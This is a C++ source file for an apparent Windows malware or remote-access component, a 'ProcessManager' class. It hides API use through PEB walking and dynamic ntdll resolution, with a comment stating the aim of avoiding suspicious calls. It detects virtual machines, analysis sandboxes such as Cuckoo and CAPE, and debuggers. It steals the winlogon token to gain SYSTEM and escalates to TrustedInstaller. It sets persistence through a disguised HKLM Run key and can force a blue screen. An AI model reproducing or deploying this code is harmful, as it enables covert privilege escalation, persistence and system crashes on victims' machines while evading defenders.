#ifndef _WIN32
#   error "This is a Windows library. This cannot be compiled for other systems."
#endif

#include "procman.hpp" // ProcessManager
#include <TlHelp32.h>
#include <vector> // std::vector

/* Function pointers to commonly used Nt API functions */
extern "C" {
    /*
        Obtain a function pointer to NtOpenProcess
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtOpenProcess.

        https://ntdoc.m417z.com/ntopenprocess
    */
    NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtOpenProcess") );
        return pFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }

    /*
        Obtain a function pointer to NtClose
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtClose

        https://ntdoc.m417z.com/ntclose
    */
    NTSTATUS SysNtClose(HANDLE handle) {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( HANDLE ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtClose") );
        return pFunc(handle);
    }

    /*
        Obtain a function pointer to NtDuplicateToken
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtDuplicateToken

        https://ntdoc.m417z.com/NtDuplicateToken
    */
    NTSTATUS SysNtDuplicateToken(
        HANDLE ExistingTokenHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        BOOLEAN EffectiveOnly,
        TOKEN_TYPE Type,
        PHANDLE NewTokenHandle
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtDuplicateToken") );
        return pFunc(ExistingTokenHandle, DesiredAccess, ObjectAttributes, EffectiveOnly, Type, NewTokenHandle);
    }

    /*
        Obtain a function pointer to NtOpenProcessTokenEx
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtOpenProcessTokenEx

        https://ntdoc.m417z.com/NtOpenProcessTokenEx
    */
    NTSTATUS SysNtOpenProcessTokenEx(
        HANDLE processHandle,
        ACCESS_MASK desiredAccess,
        ULONG handleAttributes,
        PHANDLE tokenHandle
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( HANDLE, ACCESS_MASK, ULONG, PHANDLE ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtOpenProcessTokenEx") );
        return pFunc(processHandle, desiredAccess, handleAttributes, tokenHandle);
    }

    /*
        Obtain a function pointer to NtRaiseHardError
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtRaiseHardError

        https://ntdoc.m417z.com/NtRaiseHardError
    */
    NTSTATUS SysNtRaiseHardError(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ValidResponseOptions,
        PULONG Response
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtRaiseHardError") );
        return pFunc(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOptions, Response);
    }

    /*
        Obtain a function pointer to NtRevertContainerImpersonation
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtRevertContainerImpersonation

        https://ntdoc.m417z.com/NtRevertContainerImpersonation
    */
    NTSTATUS SysNtRevertContainerImpersonation() {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtRevertContainerImpersonation") );
        return pFunc();
    }

    /*
        Obtain a function pointer to NtCreateKey
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtCreateKey

        https://ntdoc.m417z.com/NtCreateKey
    */
    NTSTATUS SysNtCreateKey(
        PHANDLE KeyHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        ULONG TitleIndex,
        PUNICODE_STRING Class,
        ULONG CreateOptions,
        PULONG Disposition
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtCreateKey") );
        return pFunc(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
    }

    /*
        Obtain a function pointer to NtSetValueKey
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtSetValueKey

        https://ntdoc.m417z.com/NtSetValueKey
    */
    NTSTATUS SysNtSetValueKey(
        HANDLE KeyHandle,
        PUNICODE_STRING ValueName,
        ULONG TitleIndex,
        ULONG Type,
        PVOID Data,
        ULONG DataSize
    )
    {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtSetValueKey") );
        return pFunc(KeyHandle, ValueName, TitleIndex, Type, Data, DataSize);
    }

    /*
        Obtain a function pointer to NtDelayExecution
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtDelayExecution

        https://ntdoc.m417z.com/NtDelayExecution
    */
    NTSTATUS SysNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( BOOLEAN, PLARGE_INTEGER ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtDelayExecution") );
        return pFunc(Alertable, DelayInterval);
    }

    /*
        Obtain a function pointer to NtShutdownSystem
        from ntdll.dll using dynamical loading. 
        This function can be treated as a call
        to NtShutdownSystem

        https://ntdoc.m417z.com/NtShutdownSystem
    */
    NTSTATUS SysNtShutdownSystem(SHUTDOWN_ACTION action) {
        static auto pFunc = reinterpret_cast< NTSTATUS(NTAPI*)( SHUTDOWN_ACTION ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "NtShutdownSystem") );
        return pFunc(action);
    }

    /*
        Get  function pointer to RtlGetCurrentPeb from
        ntdll.dll. This is used to retrieve the current process environment block.
        This isi how we get handles to loaded modules without making
        suspicous Windows API calls.

        https://ntdoc.m417z.com/rtlgetcurrentpeb
    */
    PPEB GetPebAddress() {
        static auto pFunc = reinterpret_cast< PPEB(NTAPI*) ( VOID ) >(
            GetProcAddress(GetModuleHandleW(L"ntdll"), "RtlGetCurrentPeb") );
        return pFunc();
    }
}

// Function pointer types
namespace {
    // Commonly used function signatures
    using _NtQueryInfo = NTSTATUS(WINAPI*)( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
    using _NtOpenProcessToken = NTSTATUS(WINAPI*)( HANDLE, ACCESS_MASK, PHANDLE );
    using _NtDuplicateToken = NTSTATUS(WINAPI*)( HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE );
    using _FreeDLL = BOOL(WINAPI*)( HANDLE );
    using _ImpersonateLoggedOnUser = BOOL(WINAPI*)( HANDLE );
    using _CreateToolhelp32Snapshot = HANDLE(WINAPI*)( DWORD, DWORD );
    using _OpenServiceA = SC_HANDLE(WINAPI*)( SC_HANDLE, LPCSTR, DWORD );
    using _OpenSCManagerW = SC_HANDLE(WINAPI*)( LPCWSTR, LPCWSTR, DWORD );
    using _QueryServiceStatusEx = BOOL(WINAPI*)( SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD );
    using _StartService = BOOL(WINAPI*)( SC_HANDLE, DWORD, LPCWSTR );
    using _CreateProcessWithTokenW = BOOL(WINAPI*)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
    using _Process32FirstW = BOOL(WINAPI*)( HANDLE, LPPROCESSENTRY32W );
    using _Process32NextW = BOOL(WINAPI*)( HANDLE, LPPROCESSENTRY32W );
    using _LoadLibrary = HMODULE(WINAPI*)( LPCSTR );
    using _SetThreadToken = BOOL(WINAPI*)( PHANDLE, HANDLE );
    using _GetComputerNameA = BOOL(WINAPI*)( LPSTR, LPDWORD );
    using _RtlAdjustPrivilege = NTSTATUS(WINAPI*)( ULONG, BOOLEAN, BOOLEAN, PBOOLEAN );
    using _NtRaiseHardError = NTSTATUS(WINAPI*)( NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG );
    using _GetSystemFirmwareTable = UINT(WINAPI*)( DWORD, DWORD, PVOID, DWORD );
}

/*
    Helper function to convert a string
    to all lowercase. Yes this is extremely inefficient.
*/
std::string _lower(std::string inp) {
    std::string out = "";
    for ( auto& c : inp )
        out += tolower(c);
    return out;
}

// return true if they are equal
// return false if otherwise
BOOL _sub(std::string libPath, std::string s2) {
    return libPath.find(s2) != std::string::npos;
}

/*
    Helper function to convert a PWSTR string
    to an std::string.
*/
std::string PWSTRToString(PWSTR inp) {
    std::wstring wstr(inp);
    std::string str(wstr.begin(), wstr.end());

    return str;
}

FARPROC ProcessManager::GetFunctionAddressInternal(HMODULE lib, std::string procedure) {
    // get nt and dos headers
    PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
    PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );
    IMAGE_OPTIONAL_HEADER   optHeader = ntHeader->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    // Addresses
    DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
    DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
    WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );

    for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {
        const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];
        if ( strcmp(funcName, procedure.c_str()) == 0 ) {
            DWORD funcID = funcNameOrdinals[funcIndex];
            DWORD address = functionAddresses[funcID];
            BYTE* absoluteAddress = ( ( BYTE* ) lib + address );

            return ( FARPROC ) absoluteAddress;
        }
    }
    return NULL;
}

HMODULE ProcessManager::GetLoadedModule(std::string libName)
{
    if ( this->m_LoadedDLLs.count(_lower(libName).c_str()) > 0 )
        return this->m_LoadedDLLs.find(_lower(libName).c_str())->second;

    PPEB peb = GetPebAddress();

    PPEB_LDR_DATA         LDRData = peb->Ldr;
    LIST_ENTRY* modules = &LDRData->InMemoryOrderModuleList;
    LIST_ENTRY* nextEntry = modules->Flink;
    LDR_DATA_TABLE_ENTRY* modInfo = NULL;

    while ( nextEntry != modules ) {
        modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info
        nextEntry = nextEntry->Flink; // set the current node to the next node

        if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
            HMODULE mod = ( HMODULE ) modInfo->DllBase;
            this->m_LoadedDLLs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));

            return mod;
        }
    }

    return NULL;
}

HMODULE ProcessManager::GetLoadedLib(const std::string& libName) {
    if ( this->m_LoadedDLLs.count(_lower(libName)) > 0 ) {
        return this->m_LoadedDLLs.at(_lower(libName));
    }

    return GetLoadedModule(libName);
}

bool ProcessManager::FreeUsedLibrary(const std::string& lib) {
    if ( this->m_LoadedDLLs.find(_lower(lib).c_str()) == this->m_LoadedDLLs.end() )
        return false;

    HMODULE module = this->m_LoadedDLLs.find(_lower(lib).c_str())->second;

    if ( !Call<_FreeDLL>(GetLoadedLib("kernel32.dll"), "FreeLibraryA", module) )
        return false;

    this->m_LoadedDLLs.erase(_lower(lib).c_str());

    return true;
}

ProcessManager::ProcessManager() {
    // load required mods
    if ( DllsLoaded )
        return;

    // Try and get modules without having to load them,
    // If GetLoadedModule fails, try LoadLibrary as a last resort.
    Kernel32DLL = this->GetLoadedModule("kernel32.dll");
    if ( !Kernel32DLL )
        Kernel32DLL = LoadLibraryA("kernel32.dll");

    AdvApi32DLL = this->GetLoadedModule("advapi32.dll");
    if ( !AdvApi32DLL )
        AdvApi32DLL = LoadLibraryA("advapi32.dll");

    NTDLL = this->GetLoadedModule("ntdll.dll");
    if ( !NTDLL )
        NTDLL = LoadLibraryA("ntdll.dll");

    if ( Kernel32DLL == NULL || AdvApi32DLL == NULL || NTDLL == NULL ) {
        std::cout << "Failed to load essential libraries for ProcessManager: ProcessManager() Constructor." << std::endl;
        return;
    }

    DllsLoaded = TRUE;

    this->LoadAllNatives();
}

int ProcessManager::GetSSN(HMODULE lib, std::string functionName) {
    FARPROC address = GetFunctionAddressInternal(NTDLL, functionName);
    if ( !address )
        return -1;

    BYTE* functionBytes = ( BYTE* ) address;

    for ( int offset = 0; offset < 10; offset++ ) {
        if ( functionBytes[offset] == 0xB8 ) // next byte is syscall number
            return *( int* ) ( functionBytes + offset + 1 );
    }
    return -1;
}

template <typename type>
void ProcessManager::LoadNative(const std::string& name, HMODULE from) {
    type loaded = GetFunctionAddress<type>(from, name);
    if ( !loaded ) {
        std::cout << "Error when loading native with name '" << name << "'" << std::endl;
        return;
    }

    FunctionPointer<type> fp = {};
    fp.from = from;
    fp.call = loaded;
    fp.name = name;

    this->m_Natives[name] = std::any(fp);
}

void ProcessManager::SetThisContext(SecurityContext newContext) {
    if ( newContext > this->m_Context )
        this->m_Context = newContext;
}

bool ProcessManager::RunningInVirtualMachine() {
    std::vector<unsigned char> buffer;
    std::string temp;
    const int rsmb = 1381190978; // 'RSMB'

    FunctionPointer<_GetSystemFirmwareTable> ReadBIOS = GetNative<_GetSystemFirmwareTable>("GetSystemFirmwareTable");

    DWORD size = ReadBIOS.call(rsmb, 0, nullptr, 0);
    if ( size == 0 )
        return false;

    buffer.resize(size);
    if ( ReadBIOS.call(rsmb, 0, buffer.data(), size) == 0 )
        return false;

    for ( DWORD i = 0; i < size; ++i ) {
        if ( isprint(buffer[i]) ) {
            temp += ( char ) buffer[i];
            continue;
        }

        if ( !temp.empty() ) {
            std::string lower = _lower(temp);

            if (
                lower == "qemu" ||
                lower.find("oracle") != std::string::npos ||
                lower == "virtualbox" ||
                lower.find("vbox") != std::string::npos ||
                lower.find("virtual") != std::string::npos ||
                lower.find("vmware") != std::string::npos ||
                lower.find("hyper-") != std::string::npos ||
                lower.find("microsoft corporation") != std::string::npos ||
                lower.find("xen") != std::string::npos ||
                lower.find("kvm") != std::string::npos ||
                lower.find("capa") != std::string::npos ||
                lower.find("azure") != std::string::npos ||
                lower.find("sandbox") != std::string::npos ||
                lower.find("cape") != std::string::npos ||
                lower.find("cuckoo") != std::string::npos
                )
                return true;
        }

        temp.clear();
    }

    return false;
}

void ProcessManager::AddProcessToStartup(std::string path) {
    std::string hiddenRegPath = std::string("\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

    UNICODE_STRING reg;
    reg.Buffer = wide.data();
    reg.Length = wide.size() * sizeof(wchar_t);
    reg.MaximumLength = sizeof(reg.Buffer);

    std::string hiddenName = std::string("Defaults");
    std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

    std::wstring wstrPath = std::wstring(path.begin(), path.end());

    UNICODE_STRING valueName;
    valueName.Buffer = name.data();
    valueName.Length = name.size() * sizeof(wchar_t);
    valueName.MaximumLength = sizeof(valueName.Length);

    UNICODE_STRING valueData;
    valueData.Buffer = wstrPath.data();
    valueData.Length = wstrPath.size() * sizeof(wchar_t);
    valueData.MaximumLength = sizeof(valueData.Length);

    OBJECT_ATTRIBUTES obj;
    InitializeObjectAttributes(&obj, 0, 0, 0, 0);
    obj.Length = sizeof(OBJECT_ATTRIBUTES);
    obj.RootDirectory = NULL;
    obj.ObjectName = &reg;
    obj.SecurityDescriptor = NULL;
    obj.SecurityQualityOfService = NULL;
    obj.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE key;

    NTSTATUS created = SysNtCreateKey(&key, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if ( created != STATUS_SUCCESS )
        return;

    NTSTATUS set = SysNtSetValueKey(key, &valueName, 0, REG_SZ, ( void* ) valueData.Buffer, valueData.Length);
    if ( set != STATUS_SUCCESS )
        return;
}

void ProcessManager::ShutdownSystem(SHUTDOWN_ACTION type) {
    BOOLEAN state = FALSE;

    SysNtRevertContainerImpersonation();

    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, "RtlAdjustPrivilege");
    NTSTATUS adjusted = adjust(19, TRUE, FALSE, &state);

    SysNtShutdownSystem(type);
}

void ProcessManager::BSOD() {
    BOOLEAN state = FALSE;
    ULONG   resp;

    SysNtRevertContainerImpersonation();

    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, "RtlAdjustPrivilege");
    adjust(19, TRUE, FALSE, &state);

    SysNtRaiseHardError(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &resp);
}

void ProcessManager::LoadAllNatives() {
    if ( this->m_NativesLoaded )
        return;

    LoadNative<::_GetComputerNameA>("GetComputerNameA", Kernel32DLL);
    LoadNative<::_ImpersonateLoggedOnUser>("ImpersonateLoggedOnUser", AdvApi32DLL);
    LoadNative<::_CreateToolhelp32Snapshot>("CreateToolhelp32Snapshot", Kernel32DLL);
    LoadNative<::_OpenServiceA>("OpenServiceA", AdvApi32DLL);
    LoadNative<::_OpenSCManagerW>("OpenSCManagerW", AdvApi32DLL);
    LoadNative<::_QueryServiceStatusEx>("QueryServiceStatusEx", AdvApi32DLL);
    LoadNative<::_StartService>("StartServiceW", AdvApi32DLL);
    LoadNative<::_CreateProcessWithTokenW>("CreateProcessWithTokenW", AdvApi32DLL);
    LoadNative<::_Process32NextW>("Process32NextW", Kernel32DLL);
    LoadNative<::_Process32FirstW>("Process32FirstW", Kernel32DLL);
    LoadNative<::_LoadLibrary>("LoadLibraryA", Kernel32DLL);
    LoadNative<::_GetSystemFirmwareTable>("GetSystemFirmwareTable", Kernel32DLL);

    this->m_NativesLoaded = true;
}

DWORD ProcessManager::PIDFromName(const char* name) {
    // take snapshot of all current running processes

    PROCESSENTRY32 processEntry;
    DWORD          processID = -1;
    HANDLE         processSnapshot = GetNative<::_CreateToolhelp32Snapshot>("CreateToolhelp32Snapshot").call(TH32CS_SNAPPROCESS, 0);

    if ( processSnapshot == INVALID_HANDLE_VALUE ) {
        return -1;
    }
    
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // process the first file in the snapshot, put information in processEntry
    if ( !GetNative<_Process32FirstW>("Process32FirstW").call(processSnapshot, &processEntry) ) {
        SysNtClose(processSnapshot);
        return -1;
    }

    // iterate through all running processes
    // compare the proc name to the name of the process we need
    // if they're the same, return the process id and return
    do {
        std::wstring exeFile(processEntry.szExeFile);
        std::string strExeFile(exeFile.begin(), exeFile.end());

        if ( strcmp(name, strExeFile.data()) == 0 ) {
            processID = processEntry.th32ProcessID;
            break;
        }
    } while ( GetNative<_Process32NextW>("Process32NextW").call(processSnapshot, &processEntry) ); // iterate if the next process in the snapshot is valid

    SysNtClose(processSnapshot);

    return processID;
}

HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID, bool ti) {
    OBJECT_ATTRIBUTES objectAttributes{};
    HANDLE            process = NULL;
    CLIENT_ID         pInfo{};
    pInfo.UniqueProcess = ( HANDLE ) processID;
    pInfo.UniqueThread = ( HANDLE ) 0;

    InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);

    NTSTATUS openStatus = SysNtOpenProcess(
        &process,
        MAXIMUM_ALLOWED,
        &objectAttributes,
        &pInfo
    );

    if ( openStatus != STATUS_SUCCESS )
        return NULL;

    HANDLE   processToken = NULL;
    NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);

    if ( openProcTokenStatus != STATUS_SUCCESS ) {
        SysNtClose(process);
        return NULL;
    }

    InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
    HANDLE   duplicatedToken = NULL;
    NTSTATUS tokenDuplicated = SysNtDuplicateToken(
        processToken,
        MAXIMUM_ALLOWED,
        &objectAttributes,
        FALSE,
        TokenPrimary,
        &duplicatedToken
    );

    if ( tokenDuplicated != STATUS_SUCCESS ) {
        SysNtClose(processToken);
        SysNtClose(process);
        return NULL;
    }

    SysNtClose(process);
    SysNtClose(processToken);

    return duplicatedToken;
}


bool ProcessManager::OpenProcessAsImposter(
    HANDLE token,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    bool saveOutput,
    std::string& cmdOutput
) {
    HANDLE              readFrom = nullptr, writeTo = nullptr; // read from and write to, std buffers
    STARTUPINFO         si = {};
    PROCESS_INFORMATION pi = {};
    SECURITY_ATTRIBUTES sa = {};
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);

    if ( saveOutput ) {
        CreatePipe(&readFrom, &writeTo, &sa, 0);
        SetHandleInformation(readFrom, HANDLE_FLAG_INHERIT, 0);

        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = writeTo;
        si.hStdError = writeTo;
        si.hStdInput = nullptr;
    }

    BOOL created = GetNative<::_CreateProcessWithTokenW>("CreateProcessWithTokenW").call(
        token,
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        &si,
        &pi
    );

    if ( !saveOutput )
        return created;

    if ( !created )
        return false;

    SysNtClose(writeTo);

    char        buffer[4096];
    DWORD       bytesRead = 0;

    while ( ReadFile(readFrom, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0 ) {
        buffer[bytesRead] = '\0';
        cmdOutput.append(buffer);
    }

    cmdOutput.erase(cmdOutput.rfind('\n'));

    SysNtClose(readFrom);

    return true;
}

bool ProcessManager::ElevatedPermissions() {
    TOKEN_ELEVATION elevation;
    DWORD size;
    HANDLE   processToken = NULL;
    NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(GetCurrentProcess(), TOKEN_QUERY, 0, &processToken);
    if ( openProcTokenStatus != STATUS_SUCCESS )
        return false;
    
    if ( !GetTokenInformation(processToken, TokenElevation, &elevation, sizeof(elevation), &size) )
        return false;

    BOOL elevated = elevation.TokenIsElevated;
    if ( processToken )
        SysNtClose(processToken);
    
    m_Context = ( elevated == TRUE ) ? SecurityContext::Admin : SecurityContext::User;

    return elevated;
}

DWORD ProcessManager::StartWindowsService(const std::string& serviceName) {
    SC_HANDLE scManager = GetNative<_OpenSCManagerW>("OpenSCManagerW").call(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
    if ( scManager == NULL )
        return -1;

    SC_HANDLE service = GetNative<_OpenServiceA>("OpenServiceA").call(scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE);
    if ( service == NULL ) {
        SysNtClose(scManager);
        return -1;
    }

    SERVICE_STATUS_PROCESS status = { 0 };
    DWORD statusBytesNeeded;

    // query and attempt to start, wait if stop pending, until service running
    do {
        // query the service status
        if ( !GetNative<_QueryServiceStatusEx>("QueryServiceStatusEx").call(
            service,
            SC_STATUS_PROCESS_INFO,
            ( LPBYTE ) &status,
            sizeof(SERVICE_STATUS_PROCESS),
            &statusBytesNeeded
        ) ) {
            SysNtClose(scManager);
            SysNtClose(service);
            return -1;
        }

        // check if stop pending
        if ( status.dwCurrentState == SERVICE_STOP_PENDING || status.dwCurrentState == SERVICE_START_PENDING ) {
            // wait until service is stopped 

            // recommended wait time based on microsoft win32 docs
            int wait = status.dwWaitHint / 10;

            if ( wait < 1000 )
                wait = 1000;
            else if ( wait > 10000 )
                wait = 10000;

            LARGE_INTEGER i;
            i.QuadPart = wait;

            SysNtDelayExecution(FALSE, &i);

            continue;
        }

        // service is not running
        if ( status.dwCurrentState == SERVICE_STOPPED ) {
            BOOL serviceStarted = GetNative<_StartService>("StartServiceW").call(service, 0, NULL);
            if ( !serviceStarted ) {
                SysNtClose(service);
                SysNtClose(scManager);
                return -1;
            }
        }
    } while ( status.dwCurrentState != SERVICE_RUNNING );

    // service is now started
    SysNtClose(service);
    SysNtClose(scManager);

    return status.dwProcessId;
}

HANDLE ProcessManager::ImpersonateWithToken(HANDLE token) {
    if ( !GetNative<_ImpersonateLoggedOnUser>("ImpersonateLoggedOnUser").call(token) ) {
        SysNtClose(token);
        return NULL;
    }

    return token;
}

HANDLE ProcessManager::GetSystemToken() {
    DWORD logonPID = PIDFromName("winlogon.exe");
    if ( logonPID == 0 ) // bad process id
        return NULL;

    HANDLE winlogon = CreateProcessAccessToken(logonPID);
    if ( winlogon == NULL )
        return NULL;

    HANDLE impersonate = ImpersonateWithToken(winlogon);
    if ( impersonate == NULL )
        return NULL;

    SetThisContext(SecurityContext::System);
    m_ElevatedToken = impersonate;
    return impersonate;
}

HANDLE ProcessManager::GetTrustedInstallerToken() {
    if ( m_Context < SecurityContext::System )
        this->GetSystemToken();

    DWORD  pid = StartWindowsService("TrustedInstaller");
    HANDLE token = CreateProcessAccessToken(pid, true);
    if ( token == NULL )
        return NULL;


    HANDLE impersonate = ImpersonateWithToken(token);
    if ( impersonate == NULL )
        return NULL;

    SetThisContext(SecurityContext::TrustedInstaller);
    m_ElevatedToken = impersonate;
    return impersonate;
}

bool ProcessManager::BeingDebugged() {
    PPEB filePEB = GetPebAddress();
    BYTE beingDebugged = filePEB->BeingDebugged;

    if ( beingDebugged )
        return true;

    return false;
}
